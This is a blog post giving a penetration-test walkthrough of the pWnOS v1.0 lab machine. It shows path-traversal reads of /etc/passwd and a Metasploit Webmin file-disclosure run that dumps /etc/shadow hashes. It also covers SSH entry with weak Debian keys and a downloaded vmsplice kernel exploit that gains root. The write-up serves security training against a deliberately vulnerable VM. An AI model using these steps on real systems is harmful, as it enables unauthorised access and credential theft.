
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Pentest lab - pWnOS - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="Pentesting the pWnOS VM">
  <meta name="keywords" content="pwnos, penetration testing, hacking, security, pwnos walkthrough, pwnos tutorial">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Pentest lab - pWnOS</h1>
    
    
      <p class="meta">
        








  


<time datetime="2016-02-15T07:08:57-05:00" pubdate data-updated="true">Feb 15<span>th</span>, 2016</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>I&rsquo;ve decided on a goal for 2016 to pwn as many VulnHub boxes as I can, and train myself to reach a level where I can hopefully take the OSCP. So I scrolled back in the list of VMs to start with the older ones and move towards the newer ones. Today&rsquo;s target is pWnOS v1.0, a vulnerable Linux machine that apparently contains multiple avenues for getting root</p>

<!-- more -->


<h3>Recon</h3>

<p>I fired Nmap as usual, to see what&rsquo;s listening on the box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#nmap -sT -sV 192.168.80.150
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-02-15 07:15 EST
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up, received arp-response (0.00058s latency).
</span><span class='line'>Not shown: 995 closed ports
</span><span class='line'>Reason: 995 conn-refused
</span><span class='line'>PORT      STATE SERVICE     REASON  VERSION
</span><span class='line'>22/tcp    open  ssh         syn-ack OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
</span><span class='line'>80/tcp    open  http        syn-ack Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
</span><span class='line'>139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X (workgroup: MSHOME)
</span><span class='line'>445/tcp   open  netbios-ssn syn-ack Samba smbd 3.X (workgroup: MSHOME)
</span><span class='line'>10000/tcp open  http        syn-ack MiniServ 0.01 (Webmin httpd)
</span><span class='line'>MAC Address: 00:0C:29:5E:18:C9 (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>


<p>Next, I looked at the web server, and here&rsquo;s what I saw:</p>

<p><img class="center" src="/images/pentest/pwnos/welcome.png" title="pwnos" alt="pwnos 1.0"></p>

<p>Clicking next brought me to a not-so-typical help page:</p>

<p><img class="center" src="/images/pentest/pwnos/help.png" title="help" alt="help"></p>

<p>No matter what skill level you choose, you will be taken to a mocking page with the text &ldquo;HAHAHAHA! , for a n00b you REALLY SUCK!&rdquo; (the n00b part comes from what you choose, so it will vary). I played a bit with the URL parameters, and when I modified <code><a href="http://192.168.80.150/index1.php?help=true&amp;connect=true">http://192.168.80.150/index1.php?help=true&amp;connect=true</a></code> to <code>connect=false</code>, the server spit back some PHP errors:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Warning: include(false) [function.include]: failed to open stream: No such file or directory in /var/www/index1.php on line 18
</span><span class='line'>
</span><span class='line'>Warning: include() [function.include]: Failed opening 'false' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/index1.php on line 18</span></code></pre></td></tr></table></div></figure>


<p>Thinking LFI, I tried to read a file from the system: <code>connect=../../../../etc/passwd</code>. No filtering in place!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>dhcp:x:100:101::/nonexistent:/bin/false
</span><span class='line'>syslog:x:101:102::/home/syslog:/bin/false
</span><span class='line'>klog:x:102:103::/home/klog:/bin/false
</span><span class='line'>mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
</span><span class='line'>obama:x:1001:1001::/home/obama:/bin/bash
</span><span class='line'>osama:x:1002:1002::/home/osama:/bin/bash
</span><span class='line'>yomama:x:1003:1003::/home/yomama:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>Cool, it looks like obama, osama and yomama have been busy making accounts on this box!</p>

<p>I looked next at the Webmin server:</p>

<p><img class="center" src="/images/pentest/pwnos/webmin.png" title="webmin" alt="webmin"></p>

<p>Tried logging in with the default credentials <em>root/root</em>, but it didn&rsquo;t work. Time to search for some exploits!</p>

<h3>Getting the /etc/shadow file</h3>

<p>There is a file disclosure vulnerability for the Webmin server, available in Metasploit:</p>

<blockquote><p>A vulnerability has been reported in Webmin and Usermin, which can be exploited by malicious people to disclose potentially sensitive
information. The vulnerability is caused due to an unspecified error within the handling of an URL. This can be exploited to read the contents
of any files on the server via a specially crafted URL, without requiring a valid login. The vulnerability has been reported in Webmin
(versions prior to 1.290) and Usermin (versions prior to 1.220).</p></blockquote>

<p>With it, I was able to pull the target&rsquo;s <em>/etc/shadow</em> file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/admin/webmin/file_disclosure
</span><span class='line'>msf auxiliary(file_disclosure) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/admin/webmin/file_disclosure):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting   Required  Description
</span><span class='line'>   ----     ---------------   --------  -----------
</span><span class='line'>   DIR      /unauthenticated  yes       Webmin directory path
</span><span class='line'>   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOST                      yes       The target address
</span><span class='line'>   RPATH    /etc/passwd       yes       The file to download
</span><span class='line'>   RPORT    10000             yes       The target port
</span><span class='line'>   VHOST                      no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Auxiliary action:
</span><span class='line'>
</span><span class='line'>   Name      Description
</span><span class='line'>   ----      -----------
</span><span class='line'>   Download  
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf auxiliary(file_disclosure) &gt; set RPATH /etc/shadow
</span><span class='line'>RPATH =&gt; /etc/shadow
</span><span class='line'>msf auxiliary(file_disclosure) &gt; run
</span><span class='line'>
</span><span class='line'>[*] [2016.02.24-09:02:11] Attempting to retrieve /etc/shadow...
</span><span class='line'>[*] [2016.02.24-09:02:11] The server returned: 200 Document follows
</span><span class='line'>root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
</span><span class='line'>daemon:*:14040:0:99999:7:::
</span><span class='line'>bin:*:14040:0:99999:7:::
</span><span class='line'>sys:*:14040:0:99999:7:::
</span><span class='line'>sync:*:14040:0:99999:7:::
</span><span class='line'>games:*:14040:0:99999:7:::
</span><span class='line'>man:*:14040:0:99999:7:::
</span><span class='line'>lp:*:14040:0:99999:7:::
</span><span class='line'>mail:*:14040:0:99999:7:::
</span><span class='line'>news:*:14040:0:99999:7:::
</span><span class='line'>uucp:*:14040:0:99999:7:::
</span><span class='line'>proxy:*:14040:0:99999:7:::
</span><span class='line'>www-data:*:14040:0:99999:7:::
</span><span class='line'>backup:*:14040:0:99999:7:::
</span><span class='line'>list:*:14040:0:99999:7:::
</span><span class='line'>irc:*:14040:0:99999:7:::
</span><span class='line'>gnats:*:14040:0:99999:7:::
</span><span class='line'>nobody:*:14040:0:99999:7:::
</span><span class='line'>dhcp:!:14040:0:99999:7:::
</span><span class='line'>syslog:!:14040:0:99999:7:::
</span><span class='line'>klog:!:14040:0:99999:7:::
</span><span class='line'>mysql:!:14040:0:99999:7:::
</span><span class='line'>sshd:!:14040:0:99999:7:::
</span><span class='line'>vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
</span><span class='line'>obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
</span><span class='line'>osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
</span><span class='line'>yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>From here you can crack the hashes with our pal, John the Ripper, but I won&rsquo;t go into that, because a Nessus scan revealed a shorter route to hacking the target.</p>

<h3>Exploit</h3>

<p>The host is vulnerable to the Debian OpenSSH/OpenSSL Package Random Number Generator Weakness that allows bruteforcing with precalculated SSH keys. You can read more about it <a href="https://github.com/g0tmi1k/debian-ssh">here</a>, and also download the vulnerable keys. The vulnerability stems from the fact that the random data used by the algorithm is the PID of the process generating the key.</p>

<p>Using the earlier file disclosure module of Metasploit, it&rsquo;s possible to search the contents of the <code>.ssh/authorized_keys</code> file for each user. I didn&rsquo;t find anything for root, but obama has been in the house!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(file_disclosure) &gt; set RPATH /home/obama/.ssh/authorized_keys
</span><span class='line'>RPATH =&gt; /home/obama/.ssh/authorized_keys
</span><span class='line'>msf auxiliary(file_disclosure) &gt; run
</span><span class='line'>
</span><span class='line'>[*] [2016.02.29-05:02:52] Attempting to retrieve /home/obama/.ssh/authorized_keys...
</span><span class='line'>[*] [2016.02.29-05:02:52] The server returned: 200 Document follows
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ== obama@ubuntuvm
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>So we know obama&rsquo;s public key, and we also have the vulnerable pregenerated keys that we downloaded earlier. So it&rsquo;s possible to search for this public key among all those keys:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/debian-ssh/common_keys/rsa/2048#grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ==
</span><span class='line'>dcbe2a56e8cdea6d17495f6648329ee2-4679.pub</span></code></pre></td></tr></table></div></figure>


<p>Great! A match has been found! I used to ssh on the box as obama (wouldn&rsquo;t it be nice to be able to do this on an actual White House computer.. xD)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/debian-ssh/common_keys/rsa/2048#ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@192.168.80.150
</span><span class='line'>Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>Last login: Mon Feb 29 04:44:43 2016 from 192.168.80.144
</span><span class='line'>obama@ubuntuvm:~$</span></code></pre></td></tr></table></div></figure>


<h3>Privilege escalation</h3>

<p>The kernel version of the system is outdated:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>obama@ubuntuvm:~$ uname -a
</span><span class='line'>Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>Googling it instantly brought some good news about <code>vmsplice_to_pipe()</code>, a local privilge escalation vulnerability that affects kernels prior to 2.6.24.2. And the <a href="https://www.exploit-db.com/exploits/5092/">source</a> is available on ExploitDB. You can see that the author didn&rsquo;t lack any imagination with the name of the source code file (read the first line, it&rsquo;s hilarious) xD</p>

<p>Ok, back to business. I downloaded the file on the compromised box (had to use the <code>&mdash;no-check-certificate</code> option because I would get an error otherwise):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>obama@ubuntuvm:~$ wget -O vmsplice.c https://www.exploit-db.com/download/5092 --no-check-certificate
</span><span class='line'>--05:27:51--  https://www.exploit-db.com/download/5092
</span><span class='line'>           =&gt; `vmsplice.c'
</span><span class='line'>Resolving www.exploit-db.com... 192.124.249.8
</span><span class='line'>Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
</span><span class='line'>WARNING: Certificate verification error for www.exploit-db.com: unable to get local issuer certificate
</span><span class='line'>WARNING: certificate common name `*.mycloudproxy.com' doesn't match requested host name `www.exploit-db.com'.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 6,293 (6.1K) [application/txt]
</span><span class='line'>
</span><span class='line'>100%[============================================================================================================================&gt;] 6,293         --.--K/s             
</span><span class='line'>
</span><span class='line'>05:27:52 (1.07 GB/s) - `vmsplice.c' saved [6293/6293]</span></code></pre></td></tr></table></div></figure>


<p>Compiled, and ran the code..and we are root!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>obama@ubuntuvm:~$ gcc -o vmsplice vmsplice.c
</span><span class='line'>obama@ubuntuvm:~$ ./vmsplice 
</span><span class='line'>-----------------------------------
</span><span class='line'> Linux vmsplice Local Root Exploit
</span><span class='line'> By qaaz
</span><span class='line'>-----------------------------------
</span><span class='line'>[+] mmap: 0x0 .. 0x1000
</span><span class='line'>[+] page: 0x0
</span><span class='line'>[+] page: 0x20
</span><span class='line'>[+] mmap: 0x4000 .. 0x5000
</span><span class='line'>[+] page: 0x4000
</span><span class='line'>[+] page: 0x4020
</span><span class='line'>[+] mmap: 0x1000 .. 0x2000
</span><span class='line'>[+] page: 0x1000
</span><span class='line'>[+] mmap: 0xb7e4b000 .. 0xb7e7d000
</span><span class='line'>[+] root
</span><span class='line'>root@ubuntuvm:~# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Challenge completed! :D</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Q: How many IBM types does it take to   \
</span><span class='line'>| change a light bulb? A: Fifteen. One to |
</span><span class='line'>| do it, and fourteen to write document   |
</span><span class='line'>| number                                  |
</span><span class='line'>|                                         |
</span><span class='line'>| GC7500439-0001, Multitasking            |
</span><span class='line'>| Incandescent Source System Facility,    |
</span><span class='line'>|                                         |
</span><span class='line'>| of which 10% of the pages state only    |
</span><span class='line'>| "This page intentionally                |
</span><span class='line'>|                                         |
</span><span class='line'>| left blank", and 20% of the definitions |
</span><span class='line'>| are of the form "A:.....                |
</span><span class='line'>|                                         |
</span><span class='line'>| consists of sequences of non-blank      |
</span><span class='line'>\ characters separated by blanks".        /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2016-02-15T07:08:57-05:00" pubdate data-updated="true">Feb 15<span>th</span>, 2016</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/pwnos/'>pwnos</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2016/01/09/exploit-exercises-nebula-levels-00-10/" title="Previous Post: Exploit Exercises - Nebula levels 00-10">&laquo; Exploit Exercises - Nebula levels 00-10</a>
      
      
        <a class="basic-alignment right" href="/blog/2016/03/11/pentest-lab-primer/" title="Next Post: Pentest lab - Primer">Pentest lab - Primer &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/08/25/pwnlab-init/">Pwnlab: init</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/06/09/destroy-the-necromancer/">Destroy The Necromancer</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/05/26/got-a-stapler/">Got a Stapler?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/05/13/hacking-the-milnet/">Hacking the Milnet</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/05/04/dropping-droopy/">Dropping Droopy</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
